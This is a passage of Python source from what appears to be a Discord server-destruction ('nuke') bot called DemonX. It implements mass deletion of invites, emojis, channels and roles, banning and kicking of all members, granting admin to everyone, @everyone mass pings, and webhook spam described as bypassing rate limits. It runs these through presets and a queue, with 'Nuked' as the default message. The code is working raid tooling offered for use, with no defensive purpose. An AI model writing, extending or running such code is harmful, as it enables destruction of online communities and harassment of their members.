    
    async def delete_all_invites(self, guild: discord.Guild) -> None:
        """Delete all invites"""
        print(f"{Fore.YELLOW}[*] Deleting all invites...")
        try:
            invites = await guild.invites()
            tasks = []
            for invite in invites:
                async def delete_invite(inv):
                    try:
                        await inv.delete()
                        print(f"{Fore.GREEN}[+] Deleted invite {inv.code}")
                    except:
                        pass
                
                tasks.append(delete_invite(invite))
            
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"{Fore.GREEN}[+] Deleted {len(invites)} invites")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def create_invites(self, guild: discord.Guild, count: int = 10) -> None:
        """Create multiple invite links for the guild
        
        Creates the specified number of invite links. Invites are created
        for the first available text channel. This operation is performed
        concurrently for better performance.
        
        Args:
            guild: The Discord guild to create invites for
            count: Number of invites to create (default: 10)
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks create_instant_invite permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Creating invites...")
        tasks = []
        for channel in guild.text_channels[:5]:  # Use first 5 channels
            for _ in range(count // 5):
                async def create_invite(ch):
                    try:
                        invite = await ch.create_invite(max_age=0, max_uses=0)
                        print(f"{Fore.GREEN}[+] Created invite {invite.url}")
                        return invite
                    except:
                        return None
                
                tasks.append(create_invite(channel))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def get_all_invites(self, guild: discord.Guild) -> List[discord.Invite]:
        """Retrieve all active invite links for the guild
        
        Fetches all invite links currently active in the guild, including
        information about the inviter, channel, uses, and expiration.
        
        Args:
            guild: The Discord guild to get invites from
        
        Returns:
            List of discord.Invite objects containing invite information
        
        Raises:
            discord.Forbidden: If bot lacks manage_guild permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Fetching all invites...{Style.RESET_ALL}")
        
        try:
            # Fetch invites from the guild
            invites = await guild.invites()
            
            if not invites:
                print(f"{Fore.YELLOW}[*] No invites found in this server.{Style.RESET_ALL}")
                return []
            
            # Display invites in a formatted way
            print(f"\n{Fore.CYAN}{'═'*70}")
            print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  SERVER INVITES ({len(invites)} found){Fore.CYAN}{' ' * (48 - len(str(len(invites))))}║")
            print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
            
            for i, invite in enumerate(invites, 1):
                try:
                    inviter = invite.inviter.mention if invite.inviter else "Unknown"
                    uses = f"{invite.uses}/{invite.max_uses}" if invite.max_uses else f"{invite.uses}/∞"
                    expires = invite.expires_at.strftime("%Y-%m-%d %H:%M:%S") if invite.expires_at else "Never"
                    
                    print(f"{Fore.CYAN}┌─ {Fore.GREEN}Invite #{i}{Fore.CYAN} {'─' * 60}┐")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  Code: {Fore.YELLOW}{invite.code}{Fore.CYAN}{' ' * (60 - len(invite.code))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  URL: {Fore.CYAN}{invite.url}{Fore.CYAN}{' ' * (60 - min(60, len(invite.url)))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  Created by: {Fore.YELLOW}{inviter}{Fore.CYAN}{' ' * (60 - len(str(inviter)))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  Uses: {Fore.GREEN}{uses}{Fore.CYAN}{' ' * (60 - len(uses))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}  Expires: {Fore.YELLOW}{expires}{Fore.CYAN}{' ' * (60 - len(expires))}│")
                    if invite.channel:
                        print(f"{Fore.CYAN}│{Fore.WHITE}  Channel: {Fore.CYAN}#{invite.channel.name}{Fore.CYAN}{' ' * (60 - len(invite.channel.name))}│")
                    print(f"{Fore.CYAN}└{'─' * 66}┘\n")
                except Exception as e:
                    # If individual invite parsing fails, show basic info
                    print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.YELLOW}{invite.code}: {invite.url}{Fore.CYAN}{' ' * (60 - len(invite.code) - len(invite.url))}│")
            
            print(f"{Fore.GREEN}[+] Successfully fetched {len(invites)} invite(s){Style.RESET_ALL}\n")
            return invites
            
        except discord.Forbidden:
            print(f"{Fore.RED}[!] Error: Missing 'Manage Server' permission to view invites{Style.RESET_ALL}")
            return []
        except discord.HTTPException as e:
            print(f"{Fore.RED}[!] HTTP Error: {e}{Style.RESET_ALL}")
            logger.error(f"Error fetching invites: {e}", exc_info=True)
            return []
        except Exception as e:
            print(f"{Fore.RED}[!] Error fetching invites: {e}{Style.RESET_ALL}")
            logger.error(f"Error fetching invites: {e}", exc_info=True)
            return []
    
    async def webhook_spam(self, guild: discord.Guild, message: str = "Nuked", count: int = 10, progress_callback: Optional[Callable[[int, int], None]] = None) -> None:
        """Create webhooks and send messages through them
        
        Creates webhooks in all text channels and sends the specified message
        multiple times through each webhook. This bypasses rate limits on
        regular message sending.
        
        Args:
            guild: The Discord guild to create webhooks in
            message: Message content to send (default: "Nuked")
            count: Number of messages to send per webhook (default: 10)
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_webhooks permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Creating webhooks and spamming...")
        
        text_channels = guild.text_channels
        if not text_channels:
            print(f"{Fore.YELLOW}[*] No text channels found{Style.RESET_ALL}")
            return
        
        tasks = []
        payload = {"content": message}
        for channel in text_channels:
            async def spam_webhook(ch):
                try:
                    webhook = await self.safe_execute(
                        ch.create_webhook(name="DemonX"),
                        endpoint=f"channels/{ch.id}/webhooks",
                        operation_type=OperationType.WEBHOOK_SPAM
                    )
                    if webhook:
                        webhook_url = webhook.url
                        async with aiohttp.ClientSession() as session:
                            for _ in range(count):
                                async with session.post(webhook_url, json=payload) as resp:
                                    if resp.status == 200:
                                        self._increment_stat('messages_sent')
                                    await asyncio.sleep(Config.DELAY_MINIMAL)
                except:
                    pass
            
            tasks.append(spam_webhook(channel))
        
        # Use generic batch processor with progress callback support
        if progress_callback:
            async def batch_with_progress(tasks, batch_size, delay, operation_name):
                results = []
                total = len(tasks)
                completed = 0
                for i in range(0, total, batch_size):
                    batch = tasks[i:i + batch_size]
                    batch_results = await asyncio.gather(*batch, return_exceptions=True)
                    completed += len([r for r in batch_results if not isinstance(r, Exception)])
                    if progress_callback:
                        progress_callback(completed, total)
                    results.extend([r for r in batch_results if not isinstance(r, Exception)])
                    if i + batch_size < total:
                        await asyncio.sleep(delay)
                return results
            
            await batch_with_progress(tasks, Config.BATCH_SIZE_WEBHOOK, Config.DELAY_SHORT, "webhook_spam")
        else:
            await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_WEBHOOK, delay=Config.DELAY_SHORT, operation_name="webhook_spam")
        
        print(f"{Fore.GREEN}[+] Sent {self.stats['messages_sent']} webhook messages")
    
    async def auto_react_messages(self, guild: discord.Guild, emoji: str = "💀", limit: int = 100) -> None:
        """Automatically react to recent messages in all channels
        
        Fetches recent messages from all text channels and adds the specified
        emoji reaction to each message. This operation is performed concurrently
        for better performance.
        
        Args:
            guild: The Discord guild to react to messages in
            emoji: Emoji to use for reactions (default: "💀")
            limit: Maximum number of messages per channel to react to (default: 100)
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks add_reactions permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Reacting to messages...")
        tasks = []
        for channel in guild.text_channels:
            async def react_channel(ch):
                try:
                    async for message in ch.history(limit=limit):
                        # Create coroutine inside try-except to avoid reuse issues
                        try:
                            # Direct await instead of safe_execute to avoid coroutine reuse
                            await message.add_reaction(emoji)
                            await asyncio.sleep(Config.DELAY_SHORT)
                        except discord.HTTPException as e:
                            if e.status == 429:
                                # Rate limit - wait and continue
                                await asyncio.sleep(Config.DELAY_MEDIUM)
                            elif e.status in [403, 404]:
                                # Permission denied or not found - skip
                                pass
                            else:
                                # Other errors - log and continue
                                logger.debug(f"Error reacting to message {message.id}: {e}")
                        except Exception as e:
                            logger.debug(f"Error reacting to message {message.id}: {e}")
                except Exception as e:
                    logger.warning(f"Error processing channel {ch.id}: {e}")
            
            tasks.append(react_channel(channel))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Reacted to messages")
    
    async def react_to_pinned_messages(self, guild: discord.Guild, emoji: str = "💀") -> None:
        """React to all pinned messages in the guild
        
        Fetches all pinned messages from all text channels and adds the
        specified emoji reaction to each pinned message.
        
        Args:
            guild: The Discord guild to react to pinned messages in
            emoji: Emoji to use for reactions (default: "💀")
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks add_reactions permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Reacting to pinned messages...")
        tasks = []
        for channel in guild.text_channels:
            async def react_pinned(ch):
                try:
                    pins = await ch.pins()
                    for message in pins:
                        # Direct await instead of safe_execute to avoid coroutine reuse
                        try:
                            await message.add_reaction(emoji)
                            await asyncio.sleep(Config.DELAY_SHORT)
                        except discord.HTTPException as e:
                            if e.status == 429:
                                # Rate limit - wait and continue
                                await asyncio.sleep(Config.DELAY_MEDIUM)
                            elif e.status in [403, 404]:
                                # Permission denied or not found - skip
                                pass
                            else:
                                # Other errors - log and continue
                                logger.debug(f"Error reacting to pinned message {message.id}: {e}")
                        except Exception as e:
                            logger.debug(f"Error reacting to pinned message {message.id}: {e}")
                except Exception as e:
                    logger.warning(f"Error processing channel {ch.id}: {e}")
            
            tasks.append(react_pinned(channel))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Reacted to pinned messages")
    
    # ==================== EMOJI MANAGEMENT ====================
    
    async def delete_emojis(self, guild: discord.Guild) -> None:
        """Delete all custom emojis from the guild
        
        Removes all custom emojis (both static and animated) from the guild.
        This operation is performed concurrently for better performance.
        
        Args:
            guild: The Discord guild to delete emojis from
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_emojis permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Deleting all emojis...")
        tasks = []
        for emoji in guild.emojis:
            async def delete_emoji(e):
                result = await self.safe_execute(
                    e.delete(),
                    endpoint=f"guilds/{guild.id}/emojis/{e.id}",
                    operation_type=OperationType.DELETE_EMOJI
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Deleted emoji {e.name}")
            
            tasks.append(delete_emoji(emoji))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Deleted {len(guild.emojis)} emojis")
    
    # ==================== ADVANCED FEATURES ====================
    
    async def execute_preset(self, guild: discord.Guild, preset_name: str) -> None:
        """Execute a preset"""
        preset = self.preset_manager.get_preset(preset_name)
        if not preset:
            print(f"{Fore.RED}[!] Preset '{preset_name}' not found")
            return
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Executing Preset: {preset_name}{Fore.CYAN}{' ' * (45 - len(preset_name))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        for i, operation in enumerate(preset, 1):
            op_type = operation.get('type')
            params = operation.get('params', {})
            
            print(f"{Fore.CYAN}[{i}/{len(preset)}] {Fore.YELLOW}Executing: {op_type}{Style.RESET_ALL}")
            
            # Map operation types to methods
            operations_map = {
                'ban_all': lambda g: self.ban_all_members(g),
                'kick_all': lambda g: self.kick_all_members(g),
                'delete_channels': lambda g: self.delete_channels(g),
                'create_channels': lambda g: self.create_channels(g, params.get('count', 50), params.get('name')),
                'delete_roles': lambda g: self.delete_roles(g),
                'create_roles': lambda g: self.create_roles(g, params.get('count', 50), params.get('name')),
                'delete_emojis': lambda g: self.delete_emojis(g),
                'mass_ping': lambda g: self.mass_ping(g, params.get('message', '@everyone Nuked'), params.get('count', 5)),
                'rename_channels': lambda g: self.rename_channels(g, params.get('name')),
                'rename_roles': lambda g: self.rename_roles(g, params.get('name')),
                'rename_guild': lambda g: self.rename_guild(g, params.get('name')),
                'mass_nickname': lambda g: self.mass_nickname(g, params.get('nickname')),
                'grant_admin': lambda g: self.grant_admin_all(g),
                'shuffle_channels': lambda g: self.shuffle_channels(g),
                'unban_all': lambda g: self.unban_all_members(g),
                'prune': lambda g: self.prune_members(g, params.get('days', 7)),
                'create_categories': lambda g: self.create_categories(g, params.get('count', 10), params.get('name')),
                'delete_categories': lambda g: self.delete_categories(g),
                'webhook_spam': lambda g: self.webhook_spam(g, params.get('message', 'Nuked'), params.get('count', 10)),
                'auto_react': lambda g: self.auto_react_messages(g, params.get('emoji', '💀'), params.get('limit', 100)),
            }
            
            if op_type in operations_map:
                try:
                    await operations_map[op_type](guild)
                    print(f"{Fore.GREEN}[+] Completed: {op_type}{Style.RESET_ALL}\n")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error executing {op_type}: {e}{Style.RESET_ALL}\n")
                    logger.error(f"Error executing preset operation {op_type}: {e}")
            else:
                print(f"{Fore.RED}[!] Unknown operation type: {op_type}{Style.RESET_ALL}\n")
            
            await asyncio.sleep(Config.PRESET_DELAY)
        
        print(f"{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Preset Execution Complete{Fore.CYAN}{' ' * 38}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    def get_operation_metrics(self) -> Dict[str, Any]:
        """Get operation metrics including timing and rate limits
        
        Returns:
            Dictionary with operation metrics and rate limits
        """
        metrics = {}
        
        # Calculate average times and counts for each operation type
        with self._metrics_lock:
            for op_type, timings in self.operation_metrics.items():
                if timings:
                    avg_time = sum(timings) / len(timings)
                    # Normalize operation type name to lowercase with underscores
                    # This matches the expected format in print_statistics
                    normalized_op = op_type.lower().replace(' ', '_')
                    metrics[normalized_op] = {
                        'count': len(timings),
                        'avg_time': avg_time
                    }
        
        # Add rate limits
        with self._metrics_lock:
            metrics['rate_limits'] = dict(self.rate_limit_hits)
        
        return metrics
    
    def print_statistics(self) -> None:
        """Print professional statistics dashboard"""
        elapsed = time.time() - self.stats.get('start_time', time.time())
        history_stats = self.operation_history.get_statistics()
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  DEMONX STATISTICS DASHBOARD{Fore.CYAN}{' ' * 38}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}┌─ {Fore.GREEN}{Style.BRIGHT}OPERATION STATISTICS{Fore.CYAN} {'─' * 45}┐")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Banned Members:{Fore.CYAN}{' ' * 47}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['banned']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['banned'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Kicked Members:{Fore.CYAN}{' ' * 47}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['kicked']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['kicked'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Channels Created:{Fore.CYAN}{' ' * 45}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['channels_created']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['channels_created'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Channels Deleted:{Fore.CYAN}{' ' * 45}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['channels_deleted']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['channels_deleted'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Roles Created:{Fore.CYAN}{' ' * 48}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['roles_created']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['roles_created'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Roles Deleted:{Fore.CYAN}{' ' * 48}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['roles_deleted']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['roles_deleted'])))}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Messages Sent:{Fore.CYAN}{' ' * 48}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['messages_sent']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['messages_sent'])))}│")
        print(f"{Fore.CYAN}└{'─' * 68}┘\n")
        
        print(f"{Fore.CYAN}┌─ {Fore.RED}{Style.BRIGHT}ERROR STATISTICS{Fore.CYAN} {'─' * 49}┐")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.RED}✗ Errors:{Fore.CYAN}{' ' * 55}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {self.stats['errors']}{Fore.CYAN}{' ' * (60 - len(str(self.stats['errors'])))}│")
        # Display rate limit hits from metrics
        metrics = self.get_operation_metrics()
        total_rate_limits = sum(metrics.get('rate_limits', {}).values()) if metrics.get('rate_limits') else 0
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.RED}⚠ Rate Limits:{Fore.CYAN}{' ' * 50}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {total_rate_limits}{Fore.CYAN}{' ' * (60 - len(str(total_rate_limits)))}│")
        print(f"{Fore.CYAN}└{'─' * 68}┘\n")
        
        # Display operation timing metrics if available
        if metrics and any(k != 'rate_limits' for k in metrics.keys()):
            print(f"{Fore.CYAN}┌─ {Fore.MAGENTA}{Style.BRIGHT}OPERATION METRICS{Fore.CYAN} {'─' * 48}┐")
            key_ops = ['ban', 'kick', 'create_channel', 'delete_channel', 'create_role', 'delete_role']
            for op in key_ops:
                if op in metrics and metrics[op].get('count', 0) > 0:
                    avg_time = metrics[op]['avg_time']
                    count = metrics[op]['count']
                    print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.MAGENTA}⏱ {op}:{Fore.CYAN}{' ' * (55 - len(op))}│")
                    print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ Avg: {avg_time:.2f}s ({count} ops){Fore.CYAN}{' ' * (60 - len(f'Avg: {avg_time:.2f}s ({count} ops)'))}│")
        print(f"{Fore.CYAN}└{'─' * 68}┘\n")
        
        print(f"{Fore.CYAN}┌─ {Fore.BLUE}{Style.BRIGHT}SYSTEM INFORMATION{Fore.CYAN} {'─' * 46}┐")
        print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.BLUE}⏱ Uptime:{Fore.CYAN}{' ' * 54}│")
        print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {elapsed:.2f} seconds{Fore.CYAN}{' ' * (60 - len(f'{elapsed:.2f} seconds'))}│")
        print(f"{Fore.CYAN}└{'─' * 68}┘\n")
        
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _execute_queued_operation(self, operation_type: str, params: Dict[str, Any], guild: discord.Guild) -> None:
        """Execute a queued operation
        
        Args:
            operation_type: Type of operation to execute
            params: Operation parameters
            guild: Discord guild to execute on
        """
        # Map operation types to methods (similar to preset execution)
        operations_map = {
            'ban_all': lambda g: self.ban_all_members(g, params.get('reason', 'Nuked')),
            'kick_all': lambda g: self.kick_all_members(g, params.get('reason', 'Nuked')),
            'delete_channels': lambda g: self.delete_channels(g),
            'create_channels': lambda g: self.create_channels(g, params.get('count', 50), params.get('name')),
            'delete_roles': lambda g: self.delete_roles(g),
            'create_roles': lambda g: self.create_roles(g, params.get('count', 50), params.get('name')),
            'mass_ping': lambda g: self.mass_ping(g, params.get('message', '@everyone Nuked'), params.get('count', 5)),
            'webhook_spam': lambda g: self.webhook_spam(g, params.get('message', 'Nuked'), params.get('count', 10)),
        }
        
        if operation_type in operations_map:
            try:
                await operations_map[operation_type](guild)
            except Exception as e:
                logger.error(f"Error executing queued operation {operation_type}: {e}")
        else:
            logger.warning(f"Unknown queued operation type: {operation_type}")
    
    async def _handle_queue_operations(self, guild: discord.Guild) -> None:
        """Handle queue operations menu"""
        if not QUEUE_AVAILABLE or not self.operation_queue:
            print(f"{Fore.RED}[!] Operation queue not available{Style.RESET_ALL}")
            await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Queue Operations{Fore.CYAN}{' ' * 48}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.WHITE}1. Add Ban All to Queue")
        print(f"{Fore.WHITE}2. Add Delete Channels to Queue")
        print(f"{Fore.WHITE}3. Add Create Channels to Queue")
        print(f"{Fore.WHITE}4. Add Mass Ping to Queue")
        print(f"{Fore.WHITE}5. Back to Main Menu")
        
        choice = await self._get_user_choice()
        
        if choice == "1":
            priority = await self._get_queue_priority()
            self.operation_queue.add_operation('ban_all', 'Ban All Members', {'reason': 'Nuked'}, priority)
            print(f"{Fore.GREEN}[+] Added ban_all to queue{Style.RESET_ALL}")
        elif choice == "2":
            priority = await self._get_queue_priority()
            self.operation_queue.add_operation('delete_channels', 'Delete Channels', {}, priority)
            print(f"{Fore.GREEN}[+] Added delete_channels to queue{Style.RESET_ALL}")
        elif choice == "3":
            count_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Channel count: {Style.RESET_ALL}")).strip()
            count = int(count_input) if count_input.isdigit() else 50
            priority = await self._get_queue_priority()
            self.operation_queue.add_operation('create_channels', 'Create Channels', {'count': count}, priority)
            print(f"{Fore.GREEN}[+] Added create_channels to queue{Style.RESET_ALL}")
        elif choice == "4":
            message_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Message: {Style.RESET_ALL}")).strip()
            message = message_input if message_input else "@everyone Nuked"
            priority = await self._get_queue_priority()
            self.operation_queue.add_operation('mass_ping', 'Mass Ping', {'message': message, 'count': 5}, priority)
            print(f"{Fore.GREEN}[+] Added mass_ping to queue{Style.RESET_ALL}")
        elif choice == "5":
            return  # Back to main menu
        
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _get_queue_priority(self) -> QueuePriority:
        """Get queue priority from user"""
        if not QUEUE_AVAILABLE:
            return QueuePriority.NORMAL
        
        print(f"\n{Fore.WHITE}Select Priority:")
        print(f"{Fore.WHITE}1. LOW")
        print(f"{Fore.WHITE}2. NORMAL")
        print(f"{Fore.WHITE}3. HIGH")
        print(f"{Fore.WHITE}4. CRITICAL")
        
        choice = await self._get_user_choice()
        priority_map = {
            "1": QueuePriority.LOW,
            "2": QueuePriority.NORMAL,
            "3": QueuePriority.HIGH,
            "4": QueuePriority.CRITICAL
        }
        return priority_map.get(choice, QueuePriority.NORMAL)
    
    async def _handle_view_queue(self, guild: discord.Guild) -> None:
        """Handle view queue menu"""
        if not QUEUE_AVAILABLE or not self.operation_queue:
            print(f"{Fore.RED}[!] Operation queue not available{Style.RESET_ALL}")
            return
        
        queue_list = self.operation_queue.get_queue_list()
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Operation Queue ({len(queue_list)} operations){Fore.CYAN}{' ' * (40 - len(str(len(queue_list))))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        if not queue_list:
            print(f"{Fore.YELLOW}[*] Queue is empty{Style.RESET_ALL}\n")
        else:
            for i, op in enumerate(queue_list, 1):
                scheduled = f"Scheduled: {datetime.fromtimestamp(op['scheduled_time']).strftime('%Y-%m-%d %H:%M:%S')}" if op.get('scheduled_time') else "Immediate"
                print(f"{Fore.WHITE}{i}. {op['operation_name']} (Priority: {op['priority']}, {scheduled})")
        
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_clear_queue(self, guild: discord.Guild) -> None:
        """Handle clear queue menu"""
        if not QUEUE_AVAILABLE or not self.operation_queue:
            print(f"{Fore.RED}[!] Operation queue not available{Style.RESET_ALL}")
            await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            return
        
        confirm_input = (await asyncio.to_thread(input, f"{Fore.RED}[?] Clear all queued operations? (yes/no): {Style.RESET_ALL}")).strip()
        confirm = confirm_input.lower()
        if confirm == "yes":
            count = self.operation_queue.clear_queue()
            print(f"{Fore.GREEN}[+] Cleared {count} operations from queue{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] Cancelled{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def _start_config_watcher(self):
        """Start config file watcher for hot reload"""
        self._config_watch_enabled = True
        config_path = Path('config.json')
        if config_path.exists():
            self._config_last_modified = config_path.stat().st_mtime
            self._current_config = load_config()
        
        # Start background task to check config file
        asyncio.create_task(self._watch_config_file())
    
    async def _watch_config_file(self):
        """Watch config file for changes"""
        config_path = Path('config.json')
        
        while self._config_watch_enabled:
            try:
                if config_path.exists():
                    current_mtime = config_path.stat().st_mtime
                    if current_mtime > self._config_last_modified:
                        # Config file changed
                        try:
                            new_config = load_config()
                            if new_config != self._current_config:
                                logger.info("Config file changed, reloading...")
                                self._current_config = new_config
                                self._config_last_modified = current_mtime
                                
                                # Apply config changes
                                self.use_proxy = new_config.get('proxy', False)
                                self.dry_run = new_config.get('dry_run', False)
                                self.verbose = new_config.get('verbose', True)
                                
                                print(f"\n{Fore.GREEN}[+] Configuration reloaded{Style.RESET_ALL}")
                                logger.info("Configuration hot reloaded successfully")
                        except Exception as e:
                            logger.error(f"Error reloading config: {e}")
                
                await asyncio.sleep(2.0)  # Check every 2 seconds
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error in config watcher: {e}")
                await asyncio.sleep(5.0)  # Wait longer on error
    
    async def _validate_operation(self, guild: discord.Guild, permission: str, operation_name: str) -> bool:
        """Validate operation prerequisites (permissions, guild state)
        
        Args:
            guild: The Discord guild
            permission: Required permission name (e.g., "manage_channels")
            operation_name: Name of operation for error messages
        
        Returns:
            True if operation can proceed, False otherwise
        """
        try:
            # Check if bot is in guild
            if not guild.me:
                print(f"{Fore.RED}[!] Bot is not in the guild{Style.RESET_ALL}")
                return False
            
            # Check if bot has required permission
            required_perm = getattr(discord.Permissions, permission, None)
            if required_perm:
                if not getattr(guild.me.guild_permissions, permission, False):
                    error_msg = f"Bot lacks {permission} permission required for {operation_name}"
                    print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")
                    logger.warning(error_msg)
                    return False
            
            # Check guild state (Discord.py uses 'unavailable' not 'available')
            if guild.unavailable:
                print(f"{Fore.RED}[!] Guild is not available{Style.RESET_ALL}")
                return False
            
            return True
        except Exception as e:
            logger.error(f"Error validating operation {operation_name}: {e}", exc_info=True)
            print(f"{Fore.RED}[!] Error validating operation: {e}{Style.RESET_ALL}")
            return False
    
    async def validate_permissions(self, guild: discord.Guild) -> bool:
        """Validate bot permissions"""
        if not guild.me.guild_permissions.administrator:
            print(f"{Fore.RED}[!] Bot needs administrator permissions!")
            return False
        return True
    
    # Menu handler methods
    async def _handle_ban_members(self, guild: discord.Guild) -> None:
        """Handle ban all members menu option"""
        reason_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Ban reason (optional): {Style.RESET_ALL}")).strip()
        reason = reason_input if reason_input else "Nuked"
        await self.ban_all_members(guild, reason)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_kick_members(self, guild: discord.Guild) -> None:
        """Handle kick all members menu option"""
        reason_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Kick reason (optional): {Style.RESET_ALL}")).strip()
        reason = reason_input if reason_input else "Nuked"
        await self.kick_all_members(guild, reason)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_delete_channels(self, guild: discord.Guild) -> None:
        """Handle delete channels menu option"""
        await self.delete_channels(guild)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_create_channels(self, guild: discord.Guild) -> None:
        """Handle create channels menu option"""
        count_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Channel count: {Style.RESET_ALL}")).strip()
        count = int(count_input) if count_input.isdigit() else 50
        name_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Channel name (optional): {Style.RESET_ALL}")).strip()
        name = name_input if name_input else None
        await self.create_channels(guild, count, name)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_prune(self, guild: discord.Guild) -> None:
        """Handle prune members menu option"""
        days_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Inactive days (default: 7): {Style.RESET_ALL}")).strip()
        days = int(days_input) if days_input.isdigit() else 7
